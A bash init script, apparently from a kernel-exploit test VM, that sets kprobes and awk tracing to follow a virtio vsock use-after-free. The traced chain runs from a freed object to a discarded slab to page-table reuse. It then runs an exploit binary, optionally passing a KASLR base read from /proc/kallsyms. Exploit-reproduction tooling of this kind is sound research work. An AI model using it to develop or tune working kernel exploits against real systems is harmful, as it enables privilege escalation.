#!/bin/bash
set -ex
mount -t proc none /proc
mount -t sysfs none /sys

mkdir /tmp/exp_ro
mount -t 9p exp /tmp/exp_ro

mkdir /tmp/exp
chown user:user /tmp/exp
chmod a+rx /tmp/exp

cp /tmp/exp_ro/* tmp/exp/
chmod a+rx /tmp/exp/*

# Set-up lo interface so that it's coherent with the live instance.
ifconfig lo 127.0.0.1 netmask 255.0.0.0 up

# Test-branch-only tracing in the same pinned COS guest as the repro action.
TRACE_ROOT=/sys/kernel/tracing
mkdir -p "$TRACE_ROOT"
mount -t tracefs tracefs "$TRACE_ROOT" || true
if [[ -e "$TRACE_ROOT/kprobe_events" ]]; then
    echo 0 > "$TRACE_ROOT/tracing_on"
    echo 32768 > "$TRACE_ROOT/buffer_size_kb" || true
    if echo 'p:slub_discard discard_slab cache=$arg1:x64 slab=$arg2:x64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 1 > "$TRACE_ROOT/events/kprobes/slub_discard/enable"
        echo 'COS-TRACE discard probe ready'
    fi
    if echo 'r:pte_alloc pte_alloc_one page=$retval:x64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 1 > "$TRACE_ROOT/events/kprobes/pte_alloc/enable"
        echo 'COS-TRACE PTE probe ready'
    fi
    if echo 'p:kmalloc80 kmalloc_trace cache=$arg1:x64 size=$arg3:u64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 'size == 80' > "$TRACE_ROOT/events/kprobes/kmalloc80/filter" || true
        echo 1 > "$TRACE_ROOT/events/kprobes/kmalloc80/enable"
        echo 'COS-TRACE kmalloc(80) probe ready'
    fi
    if echo 'p:vsock_reconnect vsock_connect sk=+24($arg1):x64 cid=+8($arg2):u32' >> "$TRACE_ROOT/kprobe_events"; then
        echo 'cid == 0' > "$TRACE_ROOT/events/kprobes/vsock_reconnect/filter" || true
        echo 1 > "$TRACE_ROOT/events/kprobes/vsock_reconnect/enable"
        echo 'COS-TRACE reconnect probe ready'
    fi
    if echo 'p:vvs_destruct virtio_transport_destruct vsk=$arg1:x64 vvs=+1240($arg1):x64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 1 > "$TRACE_ROOT/events/kprobes/vvs_destruct/enable"
        echo 'COS-TRACE vvs destruct probe ready'
    fi
    if echo 'p:slub_free __slab_free cache=$arg1:x64 slab=$arg2:x64 obj=$arg3:x64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 1 > "$TRACE_ROOT/events/kprobes/slub_free/enable"
        echo 'COS-TRACE slab slow-free probe ready'
    fi
    if echo 'p:uaf_connected virtio_transport_recv_pkt+0x1ca vvs=%r14:x64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 1 > "$TRACE_ROOT/events/kprobes/uaf_connected/enable"
        echo 'COS-TRACE UAF connected-path probe ready'
    fi
    if echo 'p:uaf_listen virtio_transport_recv_pkt+0x6ec vvs=%r13:x64' >> "$TRACE_ROOT/kprobe_events"; then
        echo 1 > "$TRACE_ROOT/events/kprobes/uaf_listen/enable"
        echo 'COS-TRACE UAF listen-path probe ready'
    fi
    echo 1 > "$TRACE_ROOT/tracing_on"
fi

CMD="/tmp/exp/exploit"
if [[ " $* " == *" kaslr_leak=1 "* ]]; then
    KASLR_BASE=`head -n 1 /proc/kallsyms | cut -d " " -f1`
    CMD="$CMD $KASLR_BASE"
fi

# Stream the target chain immediately so a kernel panic cannot hide it.
if [[ -e "$TRACE_ROOT/trace_pipe" ]]; then
    awk '
        function value(name, i, parts) {
            for (i = 1; i <= NF; i++)
                if (index($i, name "=") == 1) {
                    split($i, parts, "=")
                    return parts[2]
                }
            return ""
        }
        /vsock_reconnect:/ {
            sk = value("sk")
            if (sk != "") {
                attempt++
                target_sk[sk] = attempt
                print "COS-CHAIN reconnect attempt=" attempt " sk=" sk
                fflush()
            }
        }
        /vvs_destruct:/ {
            vsk = value("vsk"); vvs = value("vvs")
            if (vsk in target_sk && vvs != "" && vvs != "0x0") {
                victim[vvs] = target_sk[vsk]
                write_target[vvs] = target_sk[vsk]
                print "COS-CHAIN victim attempt=" victim[vvs] " vvs=" vvs
                delete target_sk[vsk]
                fflush()
            }
        }
        /slub_free:/ {
            obj = value("obj"); slab = value("slab")
            if (obj in victim && slab != "") {
                victim_slab[slab] = victim[obj]
                target_slab_by_vvs[obj] = slab
                print "COS-CHAIN slow-free origin=" victim_slab[slab] " slab=" slab
                delete victim[obj]
                fflush()
            }
        }
        /slub_discard:/ {
            slab = value("slab")
            if (slab in victim_slab) {
                discarded_victim[slab] = victim_slab[slab]
                print "COS-CHAIN discarded origin=" discarded_victim[slab] " now=" attempt " slab=" slab
                delete victim_slab[slab]
                fflush()
            }
        }
        /pte_alloc:/ {
            page = value("page")
            if (page in discarded_victim) {
                pte_for_slab[page] = attempt
                print "COS-CHAIN PTE origin=" discarded_victim[page] " now=" attempt \
                    " same=" (discarded_victim[page] == attempt) " page=" page
                delete discarded_victim[page]
                fflush()
            }
        }
        /uaf_connected:|uaf_listen:/ {
            vvs = value("vvs")
            if (vvs in write_target) {
                uaf_count[vvs]++
                if (uaf_count[vvs] <= 3) {
                    slab = target_slab_by_vvs[vvs]
                    print "COS-CHAIN UAF write-path origin=" write_target[vvs] " now=" attempt \
                        " pte_before=" (slab != "" && pte_for_slab[slab] == write_target[vvs]) \
                        " path=" ($0 ~ /uaf_connected:/ ? "connected" : "listen") " vvs=" vvs
                    fflush()
                }
            }
        }
        { if (++events % 20000 == 0) { print "COS-CHAIN progress events=" events; fflush() } }
    ' "$TRACE_ROOT/trace_pipe" &
    TRACE_PID=$!
fi

echo "running exploit, cmd='$CMD', ::EXPLOIT OUTPUT FROM HERE::"
su user -c "$CMD" || true
if [[ -n "${TRACE_PID:-}" ]]; then kill "$TRACE_PID" || true; fi
if [[ -e "$TRACE_ROOT/trace" && -z "${TRACE_PID:-}" ]]; then
    echo 0 > "$TRACE_ROOT/tracing_on"
    awk '
        /vsock_reconnect:/ {
            reconnect++
            sk = ""; cid = ""
            for (i = 1; i <= NF; i++) {
                if ($i ~ /^sk=/) { split($i, parts, "="); sk = parts[2] }
                if ($i ~ /^cid=/) { split($i, parts, "="); cid = parts[2] }
            }
            if (cid == "0" && sk != "") target_sk[sk] = 1
        }
        /vvs_destruct:/ {
            vsk = ""; vvs = ""
            for (i = 1; i <= NF; i++) {
                if ($i ~ /^vsk=/) { split($i, parts, "="); vsk = parts[2] }
                if ($i ~ /^vvs=/) { split($i, parts, "="); vvs = parts[2] }
            }
            if (vsk in target_sk && vvs != "" && vvs != "0x0") {
                victim[vvs] = 1
                victim_destruct++
                if (victim_destruct <= 5) print "COS-TRACE target-vvs=" vvs
            }
        }
        /slub_free:/ {
            slab = ""; obj = ""
            for (i = 1; i <= NF; i++) {
                if ($i ~ /^slab=/) { split($i, parts, "="); slab = parts[2] }
                if ($i ~ /^obj=/) { split($i, parts, "="); obj = parts[2] }
            }
            if (obj in victim && slab != "") {
                victim_slow++
                victim_slab[slab] = obj
            }
        }
        /kmalloc80:/ {
            size = ""; cache = ""
            for (i = 1; i <= NF; i++) {
                if ($i ~ /^size=/) { split($i, parts, "="); size = parts[2] }
                if ($i ~ /^cache=/) { split($i, parts, "="); cache = parts[2] }
            }
            if (size == "80" && cache != "") kmalloc80[cache]++
        }
        /slub_discard:/ {
            discarded++
            cache = ""; slab = ""
            for (i = 1; i <= NF; i++) {
                if ($i ~ /^cache=/) { split($i, parts, "="); cache = parts[2] }
                if ($i ~ /^slab=/) { split($i, parts, "="); slab = parts[2] }
            }
            if (slab != "") freed[slab] = cache
            if (cache != "") discard_by_cache[cache]++
            if (slab in victim_slab) {
                victim_discard++
                discarded_victim[slab] = 1
                if (victim_discard <= 5) print "COS-TRACE target slab discarded=" slab
            }
        }
        /pte_alloc:/ {
            allocated++
            page = ""
            for (i = 1; i <= NF; i++)
                if ($i ~ /^page=/) { split($i, parts, "="); page = parts[2] }
            if (page != "" && page != "0x0" && (page in freed)) {
                reused++
                reuse_by_cache[freed[page]]++
                if (reused <= 5) print "COS-TRACE reused slab cache=" freed[page] " page=" page
            }
            if (page in discarded_victim) {
                victim_pte++
                if (victim_pte <= 5) print "COS-TRACE target slab reused as PTE=" page
            }
        }
        END {
            print "COS-TRACE totals discarded=" discarded + 0 " pte=" allocated + 0 " reuse=" reused + 0
            print "COS-TRACE target reconnect=" reconnect + 0 " destruct=" victim_destruct + 0 \
                " slow_free=" victim_slow + 0 " discarded=" victim_discard + 0 \
                " pte_reuse=" victim_pte + 0
            for (cache in kmalloc80)
                print "COS-TRACE kmalloc80 cache=" cache " calls=" kmalloc80[cache] + 0 \
                    " discard=" discard_by_cache[cache] + 0 " pte_reuse=" reuse_by_cache[cache] + 0
        }
    ' "$TRACE_ROOT/trace" || true
    grep -E 'vsock_reconnect:|vvs_destruct:|slub_free:|slub_discard:|pte_alloc:' "$TRACE_ROOT/trace" | tail -n 20 || true
fi
